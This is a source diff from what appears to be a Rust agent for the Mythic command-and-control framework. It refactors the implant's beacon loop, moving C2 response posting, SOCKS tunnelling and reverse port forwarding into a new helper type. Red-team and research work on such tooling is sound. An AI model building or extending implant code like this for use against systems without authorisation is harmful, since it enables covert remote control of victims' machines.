@@ -4,23 +4,15 @@ use std::sync::{
     Arc, Mutex,
     mpsc::{self, Receiver, RecvTimeoutError, Sender, SyncSender, TrySendError},
 };
-use std::thread::sleep;
 use std::time::{Duration, Instant};
 
-use mythic::{
-    Aes256HmacCrypto, AgentExtras, AgentMessageExtras, AgentResponseExtras, C2Transport,
-    MythicAgent, MythicError, MythicResult, ReqPostResponse, RespGetTasking, TaskResponse,
-    decode_message, decode_message_plain, encode_message, encode_message_plain,
-};
+use mythic::{C2Transport, MythicAgent, MythicError, MythicResult, TaskResponse};
 use rand::seq::SliceRandom;
-use serde::Deserialize;
 use uuid::Uuid;
 
-use crate::auxiliary::AuxiliaryManager;
 use crate::config::Config;
 use crate::dispatch;
-use crate::rpfwd::RpfwdManager;
-use crate::socks::SocksManager;
+use crate::protocol_pump::ProtocolPump;
 use crate::sys::metadata;
 use crate::{
     DEBUG, EXIT_PROCESS, INTERVAL, JITTER, KILLDATE, SHOULD_EXIT, set_killdate, set_sleep,
@@ -33,7 +25,6 @@ const TASK_WORKER_THREADS: usize = 4;
 const CWD_TASK_WORKER_THREADS: usize = 1;
 const TASK_QUEUE_CAPACITY: usize = 32;
 const CWD_TASK_QUEUE_CAPACITY: usize = 32;
-const MAX_POST_RESPONSE_DRAIN_CYCLES: usize = 10_000;
 const MIN_BEACON_DELAY: Duration = Duration::from_millis(250);
 
 struct CompletedTask {
@@ -154,157 +145,6 @@ fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<Myth
     Err(MythicError::InvalidPacket)
 }
 
-fn get_tasking_with<C: C2Transport>(
-    mythic: &MythicAgent,
-    task_size: u32,
-    c2: &C,
-    responses: Vec<TaskResponse>,
-    shared: AgentExtras,
-) -> MythicResult<RespGetTasking> {
-    let extras = AgentMessageExtras { responses, shared };
-    mythic.get_tasking_with(task_size, c2, extras)
-}
-
-#[derive(Debug, Deserialize)]
-struct RichPostResponse {
-    #[allow(dead_code)]
-    action: String,
-    #[serde(default)]
-    responses: Vec<dispatch::PostResponseReceipt>,
-    #[serde(flatten)]
-    #[allow(dead_code)]
-    extras: AgentResponseExtras,
-}
-
-fn post_response_rich<C: C2Transport>(
-    mythic: &MythicAgent,
-    responses: Vec<TaskResponse>,
-    shared: AgentExtras,
-    c2: &C,
-) -> MythicResult<RichPostResponse> {
-    let req = ReqPostResponse::from_extras(AgentMessageExtras { responses, shared });
-    if let Some(key_b64) = c2.get_aes_psk() {
-        let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
-        let iv = c2.random_iv()?;
-        let packed = encode_message(&req, mythic.callback_uuid(), &crypto, &iv)?;
-        let response = c2.post_response(&packed)?;
-        decode_message(&response, Some(mythic.callback_uuid()), &crypto).map(|(_, r)| r)
-    } else {
-        let packed = encode_message_plain(&req, mythic.callback_uuid())?;
-        let response = c2.post_response(&packed)?;
-        decode_message_plain(&response, Some(mythic.callback_uuid())).map(|(_, r)| r)
-    }
-}
-
-fn post_pending_once<C: C2Transport>(
-    mythic: &MythicAgent,
-    c2: &C,
-    pending: &mut Vec<TaskResponse>,
-    socks: &mut SocksManager,
-    rpfwd: &mut RpfwdManager,
-    auxiliary: &mut AuxiliaryManager,
-) -> MythicResult<()> {
-    let socks_out = socks.drain_outbound();
-    let rpfwd_out = rpfwd.drain_outbound();
-    let mut shared = AgentExtras::default();
-    shared.socks = socks_out;
-    shared.rpfwd = rpfwd_out;
-    auxiliary.drain_into(&mut shared);
-    if pending.is_empty()
-        && shared.socks.is_empty()
-        && shared.rpfwd.is_empty()
-        && shared.alerts.is_empty()
-    {
-        return Ok(());
-    }
-    let batch = std::mem::take(pending);
-    let cloned_for_retry = batch.clone();
-    let retry_socks = shared.socks.clone();
-    let retry_rpfwd = shared.rpfwd.clone();
-    let retry_alerts = shared.alerts.clone();
-    match post_response_rich(mythic, batch, shared, c2) {
-        Ok(receipt) => {
-            auxiliary.handle_inbound(&receipt.extras);
-            socks.handle_inbound(receipt.extras.socks.clone());
-            rpfwd.handle_inbound(receipt.extras.rpfwd.clone());
-            pending.extend(dispatch::responses_from_post_response_receipts(
-                &receipt.responses,
-            ));
-            Ok(())
-        }
-        Err(e) => {
-            pending.extend(cloned_for_retry);
-            socks.requeue_outbound_front(retry_socks);
-            rpfwd.requeue_outbound_front(retry_rpfwd);
-            auxiliary.requeue_alerts_front(retry_alerts);
-            Err(e)
-        }
-    }
-}
-
-fn post_pending_until_drained<C: C2Transport>(
-    mythic: &MythicAgent,
-    c2: &C,
-    pending: &mut Vec<TaskResponse>,
-    socks: &mut SocksManager,
-    rpfwd: &mut RpfwdManager,
-    auxiliary: &mut AuxiliaryManager,
-) -> MythicResult<()> {
-    for _ in 0..MAX_POST_RESPONSE_DRAIN_CYCLES {
-        if pending.is_empty()
-            && !socks.wants_fast_poll()
-            && !rpfwd.wants_fast_poll()
-            && !auxiliary.wants_fast_poll()
-        {
-            return Ok(());
-        }
-        let before_pending = pending.len();
-        post_pending_once(mythic, c2, pending, socks, rpfwd, auxiliary)?;
-        if pending.is_empty() && before_pending == 0 {
-            return Ok(());
-        }
-    }
-    Err(MythicError::protocol(format!(
-        "post_response drain exceeded {MAX_POST_RESPONSE_DRAIN_CYCLES} cycles with {} response(s) still pending",
-        pending.len()
-    )))
-}
-
-fn flush_pending<C: C2Transport>(
-    mythic: &MythicAgent,
-    c2: &C,
-    mut pending: Vec<TaskResponse>,
-    socks: &mut SocksManager,
-    rpfwd: &mut RpfwdManager,
-    auxiliary: &mut AuxiliaryManager,
-) {
-    if pending.is_empty()
-        && !socks.wants_fast_poll()
-        && !rpfwd.wants_fast_poll()
-        && !auxiliary.wants_fast_poll()
-    {
-        return;
-    }
-    let total = pending.len();
-    info!("[*] flushing {} response(s) before exit", total);
-    for attempt in 1..=3u32 {
-        match post_pending_until_drained(mythic, c2, &mut pending, socks, rpfwd, auxiliary) {
-            Ok(_) => return,
-            Err(e) => {
-                if DEBUG.load(Ordering::Relaxed) {
-                    eprintln!("[!] flush attempt {attempt}/3 failed: {e}");
-                }
-                if attempt < 3 {
-                    sleep(Duration::from_secs(1));
-                }
-            }
-        }
-    }
-    if DEBUG.load(Ordering::Relaxed) {
-        eprintln!("[!] flush dropped {total} response(s) after 3 attempts");
-    }
-}
-
 /// If EXIT_PROCESS is set, terminate the process after flushing responses.
 fn maybe_exit_process() {
     if EXIT_PROCESS.load(Ordering::Acquire) {
@@ -331,33 +171,26 @@ fn next_beacon_delay() -> Duration {
 
 fn handle_completed_task(
     completed: CompletedTask,
-    pending: &mut Vec<TaskResponse>,
+    pump: &mut ProtocolPump,
     next_tasking_at: &mut Instant,
 ) {
     if completed.command == "sleep" {
         *next_tasking_at = Instant::now() + next_beacon_delay();
     }
-    pending.extend(completed.responses);
+    pump.pending_mut().extend(completed.responses);
 }
 
 fn post_ready_responses<C: C2Transport, R: rand::Rng + ?Sized>(
     mythic: &MythicAgent,
     profiles: &[C],
     rng: &mut R,
-    pending: &mut Vec<TaskResponse>,
-    socks: &mut SocksManager,
-    rpfwd: &mut RpfwdManager,
-    auxiliary: &mut AuxiliaryManager,
+    pump: &mut ProtocolPump,
 ) -> MythicResult<()> {
-    if pending.is_empty()
-        && !socks.wants_fast_poll()
-        && !rpfwd.wants_fast_poll()
-        && !auxiliary.wants_fast_poll()
-    {
+    if !pump.has_pending_work() {
         return Ok(());
     }
     let c2 = profiles.choose(rng).unwrap();
-    post_pending_until_drained(mythic, c2, pending, socks, rpfwd, auxiliary)
+    pump.post_until_drained(mythic, c2)
 }
 
 fn wait_for_responses_until<C: C2Transport, R: rand::Rng + ?Sized>(
@@ -365,41 +198,33 @@ fn wait_for_responses_until<C: C2Transport, R: rand::Rng + ?Sized>(
     profiles: &[C],
     rng: &mut R,
     completed_rx: &Receiver<CompletedTask>,
-    pending: &mut Vec<TaskResponse>,
-    socks: &mut SocksManager,
-    rpfwd: &mut RpfwdManager,
-    auxiliary: &mut AuxiliaryManager,
+    pump: &mut ProtocolPump,
     next_tasking_at: &mut Instant,
 ) -> MythicResult<()> {
     loop {
         while let Ok(completed) = completed_rx.try_recv() {
-            handle_completed_task(completed, pending, next_tasking_at);
+            handle_completed_task(completed, pump, next_tasking_at);
         }
 
-        post_ready_responses(mythic, profiles, rng, pending, socks, rpfwd, auxiliary)?;
+        post_ready_responses(mythic, profiles, rng, pump)?;
 
         if SHOULD_EXIT.load(Ordering::Acquire)
             || past_killdate()
             || Instant::now() >= *next_tasking_at
-            || socks.wants_fast_poll()
-            || rpfwd.wants_fast_poll()
-            || auxiliary.wants_fast_poll()
+            || pump.wants_fast_poll()
         {
             return Ok(());
         }
 
         let timeout = next_tasking_at
             .saturating_duration_since(Instant::now())
-            .min(
-                if socks.wants_fast_poll() || rpfwd.wants_fast_poll() || auxiliary.wants_fast_poll()
-                {
-                    MIN_BEACON_DELAY
-                } else {
-                    Duration::from_secs(60)
-                },
-            );
+            .min(if pump.wants_fast_poll() {
+                MIN_BEACON_DELAY
+            } else {
+                Duration::from_secs(60)
+            });
         match completed_rx.recv_timeout(timeout) {
-            Ok(completed) => handle_completed_task(completed, pending, next_tasking_at),
+            Ok(completed) => handle_completed_task(completed, pump, next_tasking_at),
             Err(RecvTimeoutError::Timeout) => {}
             Err(RecvTimeoutError::Disconnected) => return Ok(()),
         }
@@ -470,10 +295,7 @@ pub fn run(config: Config) -> MythicResult<()> {
     }
 
     let mut rng = rand::thread_rng();
-    let mut pending: Vec<TaskResponse> = Vec::new();
-    let mut socks = SocksManager::new();
-    let mut rpfwd = RpfwdManager::new();
-    let mut auxiliary = AuxiliaryManager::new();
+    let mut pump = ProtocolPump::new();
     let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
     let task_tx = start_task_workers(
         TASK_WORKER_THREADS,
@@ -493,10 +315,7 @@ pub fn run(config: Config) -> MythicResult<()> {
             &profiles,
             &mut rng,
             &completed_rx,
-            &mut pending,
-            &mut socks,
-            &mut rpfwd,
-            &mut auxiliary,
+            &mut pump,
             &mut next_tasking_at,
         ) {
             if DEBUG.load(Ordering::Relaxed) {
@@ -509,40 +328,29 @@ pub fn run(config: Config) -> MythicResult<()> {
         if past_killdate() {
             println!("[*] past killdate, exiting");
             let c2 = profiles.choose(&mut rng).unwrap();
-            flush_pending(&mythic, c2, pending, &mut socks, &mut rpfwd, &mut auxiliary);
+            pump.flush(&mythic, c2);
             maybe_exit_process();
             return Ok(());
         }
 
         if SHOULD_EXIT.load(Ordering::Acquire) {
             let c2 = profiles.choose(&mut rng).unwrap();
-            flush_pending(&mythic, c2, pending, &mut socks, &mut rpfwd, &mut auxiliary);
+            pump.flush(&mythic, c2);
             maybe_exit_process();
             info!("[*] agent exited (thread)");
             return Ok(());
         }
 
         let c2 = profiles.choose(&mut rng).unwrap();
-        let socks_out = socks.drain_outbound();
-        let rpfwd_out = rpfwd.drain_outbound();
-        let retry_socks = socks_out.clone();
-        let retry_rpfwd = rpfwd_out.clone();
-        let mut shared = AgentExtras::default();
-        shared.socks = socks_out;
-        shared.rpfwd = rpfwd_out;
-        auxiliary.drain_into(&mut shared);
-        let retry_alerts = shared.alerts.clone();
-        match get_tasking_with(&mythic, 5, c2, Vec::new(), shared) {
+        match pump.get_tasking(&mythic, 5, c2) {
             Ok(tasking) => {
                 if DEBUG.load(Ordering::Relaxed) {
                     info!("task: {:?}", tasking);
                 }
-                auxiliary.handle_inbound(&tasking.extras);
-                socks.handle_inbound(tasking.extras.socks.clone());
-                rpfwd.handle_inbound(tasking.extras.rpfwd.clone());
                 for task in tasking.tasks {
                     if task.command == "rpfwd" {
-                        pending.push(rpfwd.start_from_task(&task));
+                        let response = pump.start_rpfwd(&task);
+                        pump.pending_mut().push(response);
                         continue;
                     }
 
@@ -557,19 +365,13 @@ pub fn run(config: Config) -> MythicResult<()> {
                         queue_task_or_fail(task, &task_tx, &completed_tx)?;
                     }
                 }
-                next_tasking_at = if socks.wants_fast_poll()
-                    || rpfwd.wants_fast_poll()
-                    || auxiliary.wants_fast_poll()
-                {
+                next_tasking_at = if pump.wants_fast_poll() {
                     Instant::now() + MIN_BEACON_DELAY
                 } else {
                     Instant::now() + next_beacon_delay()
                 };
             }
             Err(e) => {
-                socks.requeue_outbound_front(retry_socks);
-                rpfwd.requeue_outbound_front(retry_rpfwd);
-                auxiliary.requeue_alerts_front(retry_alerts);
                 if DEBUG.load(Ordering::Relaxed) {
                     eprintln!("[!] get_tasking failed: {e}");
                 }
